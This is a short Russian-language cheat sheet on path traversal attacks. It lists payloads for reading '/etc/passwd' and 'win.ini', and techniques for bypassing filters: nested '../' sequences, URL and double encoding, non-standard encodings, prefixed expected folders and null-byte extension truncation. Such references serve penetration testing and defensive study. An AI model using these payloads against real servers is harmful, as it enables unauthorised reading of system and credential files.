Обход файловых путей (Path Traversal/Directory Traversal) - чтение файлов сервера путем внедрения в значение параметра или куки путь к файлу. В некоторых случаях возможна запись в файлы на сервере. 
## Полезная нагрузка
- ### Linux
	- `../../../../../etc/passwd`
- ### Windows
	- `../../../../../windows/win.ini` 
	- `..\..\..\..\..\windows\win.ini`
## Обход защиты
- Использование абсолютного пути: `filename=/etc/passwd`
- Вложенные последовательности: `....//`, `....\/` (после удаления `../`, `..\` останется `../`, нагрузка будет иметь вид: `....//....//....//....//....//....//etc/passwd`)
- URL encoding, URL double encoding: `../` -> `%2e%2e%2f`, `%252e%252e%252f`
- Нестандартные кодировки: `../` -> `..%c0%af`, `..%ef%bc%8f`
- Приложение может требовать, чтобы предоставленное пользователем имя файла начиналось с ожидаемой папки (`/var/www/images`), тогда атакующий может вставить ее в путь перед полезной нагрузкой: `filename=/var/www/images/../../../etc/passwd`
- Приложение может требовать, чтобы путь заканчивался на определенное расширение файла (`.png`), атакующий может использовать нулевые байты для отсечения расширения: `filename=../../../etc/passwd%00.png`
